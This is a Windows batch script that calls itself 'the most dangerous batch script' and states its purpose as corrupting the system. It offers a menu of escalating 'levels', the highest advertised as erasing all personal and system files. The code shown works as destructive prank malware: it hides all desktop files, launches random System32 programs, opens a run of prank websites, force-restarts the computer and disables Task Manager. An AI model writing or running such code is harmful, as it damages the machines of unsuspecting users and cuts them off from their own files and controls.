@echo off
::Global level variables
set lvl[0]=[Level Casual]
set lvl[1]=[Level Normal]
set lvl[2]=[Level Annoying]
set lvl[3]=[Level Harsh]
set lvl[4]=[Level Cruel]
set lvl[5]=[Level Deadly]

:Main
@echo off
cls

color 17

set regKApp=HKEY_LOCAL_MACHINE\Immortal
set regSColor=/v Theme
set regVTheme=17

setlocal enabledelayedexpansion 

title %scriptName% - The most dangerous batch script!

set Version=1.0 Release
set Os=Windows 8.1 and newer
set Purpose=Just to corrupt this system
set Credits=Subscribe to CYBER SOLDIER :D
set /a Stars=50
set star=

set keyExit=Exit application

for /l %%s in (0, 1, %Stars%) do (
	set "star=!star!*"
)

echo %star%
echo Welcome to the most dangerous batch script!
echo Current version: %Version%
echo Targeted Operating System: %Os%
echo Purpose: %Purpose%
echo %Credits%
echo %star%

set /a Hashes=60
set hash=

for /l %%h in (0, 1, %Hashes%) do (
	set "hash=!hash!#"
)

echo.
echo Here you can choose the level that you want to try.
echo Each level is described according to its destructive ability.
echo The least dangerous aka the safest is - [Level Casual].
echo The most dangerous is called - [Level Deadly].
echo.
echo Press (A) - (G) to choose the level.
echo %hash%

endlocal

set customPause=Press any key to launch next payload ...
set /a countdown=5

echo.
echo (A) - 0. %lvl[0]%
echo Description: Not destructive at all. This level provides basic tricks with your pc.
echo.
echo (B) - 1. %lvl[1]%
echo Description: Still not destructive, but for the common user it can be a nightmare.
echo.
echo (C) - 2. %lvl[2]%
echo Description: This level can be described as a very spammy and nasty. It can make you very angry :)
echo.
echo (D) - 3. %lvl[3]%
echo Description: From the level name, we can assume that it can do some kind of damage.
echo You will be still able to boot into your system again, but expect some kind of damage.
echo.
echo (F) - 4. %lvl[4]%
echo Description: You really don't want to mess with Cruel Level.
echo The system will be corrupted, but if you're smart enough you can repair it.
echo.
echo (G) - 5. %lvl[5]%
echo Description: The most insane level. It will erase all your personal and system files.
echo Be very careful about this one! After execution, it is not possible to repair the system.
echo.

echo.
echo (E) - Exit

::Menu handler
choice /c ABCDFGE /n /m ""

if errorlevel 7 (
	exit
) else if errorlevel 6 (
	call :LDeadly
) else if errorlevel 5 (
	call :LCruel
) else if errorlevel 4 (
	call :LHarsh
) else if errorlevel 3 (
	call :LAnnoying
) else if errorlevel 2 (
	call :LNormal
) else if errorlevel 1 (
	call :LCasual
)

::Level 0. - Casual
:LCasual

cls

echo Do you want to execute %lvl[0]% (Y/N)?

choice /c YN /n /m ""

if errorlevel 2 (
	goto Main
)

cls

::Payload - Hidden files
set desktopPath="C:\Users\%realName%\Desktop"

call :Timer %countdown%

attrib +h %desktopPath%\*.* /s /d

cls

echo 1. Payload - All your files on the desktop have been set to hidden!
echo.
echo %customPause%
pause >nul

::Payload - Random programs

call :Timer %countdown%

setlocal enabledelayedexpansion

set /a index=0
set system32Path=C:\Windows\System32
set /a maxPrograms=30

for /f "delims=" %%f in ('dir %system32Path%\*.exe %system32Path%\*.scr /b') do (
	set /a index+=1
	set "program[!index!]=%%f"
)

for /l %%n in (0, 1, %maxPrograms%) do (
	timeout /t 1 /nobreak >nul
	set /a randomNum=!random! %% !index!

	call :sub_RandomProgram %system32Path%, !randomNum!, %%n, %maxPrograms%
)

:sub_RandomProgram

if %3 neq %4 (
	set file="%~1\!program[%~2]!"

	start "" %file%
	echo Attempt to launch %file%.

	exit /b /0
)

endlocal

cls

echo 2. Payload - Some random applications have been executed!
echo.
echo %customPause%

pause >nul

::Random websites

call :Timer %countdown%

setlocal enabledelayedexpansion

set webSite[0]=https://www.youtube.com/
set webSite[1]=https://www.google.com/search?client=firefox-b-d^&q=how+to+download+bonzibuddy
set webSite[2]=https://www.google.com/search?client=firefox-b-d^&q=batch+script+course
set webSite[3]=https://bonzi.link/
set webSite[4]=https://youareanidiot.cc/
set webSite[5]=https://www.youtube.com/watch?v=TGqBs9Fx1bM^&list=PLyaHtebcT05enJaKsS7VxzojxGMoDzq3R
set webSite[6]=https://www.youtube.com/shorts/Lpau5V2jLAE
set webSite[7]=https://www.reddit.com/media?url=https^%3A^%2F^%2Fi.redd.it^%2Fnrbim3cb7r771.jpg^&rdt^=44985
set webSite[8]=https://chatgpt.com/
set webSite[9]=https://www.google.com/search?client=firefox-b-d^&q=google+p^%C5^%99eklada^%C4^%8D
set webSite[10]=https://www.bing.com/search?q=google+is+better^&form=QBLH^&sp=-1^&ghc=1^&lq=0^&pq=google+is+better^&sc=12-16^&qs=n^&sk=^&cvid=929D54F58D9349E6B72119A47C26C97E^&ghsh=0^&ghacc=0^&ghpl=
set webSite[11]=https://search.yahoo.com/search?p=deadest+engine+ever^%21^%21^&fr=yfp-t^&fr2=p^%3Afp^%2Cm^%3Asb^&ei=UTF-8^&fp=1
set webSite[12]=https://www.quora.com/Why-am-I-black-Can-you-explain-to-me
set webSite[13]=https://www.crazygames.cz/hra/plazma-burst
set webSite[14]=https://www.reddit.com/r/geek/comments/exeqr/dae_remember_the_old_norton_antivirus_boxes/?rdt^=58720

set /a arraySize=0
:GetArraySize

if defined webSite[%arraySize%] (
	set /a arraySize+=1
	goto GetArraySize
)

for /l %%n in (0, 1, %arraySize%) do (
	timeout /t 1 /nobreak >nul

	set /a rand=!random! %% %arraySize%
	call :sub_RandomSites !rand!, %%n, %arraySize%
)

:sub_RandomSites

if %2 leq %3 (
	start !webSite[%1]!
	exit /b 0
)

endlocal

cls

echo 3. Payload - Hope you enjoyed browsing on the internet!
echo.
echo %customPause%

pause >nul

::Restart pc

call :Timer %countdown%

echo Let's restart this computer :D

shutdown /r /f /t 3

call :FinalMsg 0

goto Main

::Level 1. - Normal
:LNormal

reg query "HKEY_LOCAL_MACHINE"

if %errorlevel% neq 0 (
	call :BlockRegistry "0"
)

cls

color a0

echo Do you want to execute %lvl[1]% (Y/N)?

choice /c YN /n /m ""

if errorlevel 2 (
	goto Main
)

::Disable Task Manager

call :Timer %countdown%

call :DisableTaskMgr

cls

echo 1. Payload - Try to open the Task Manager bozo!
echo.
echo %customPause%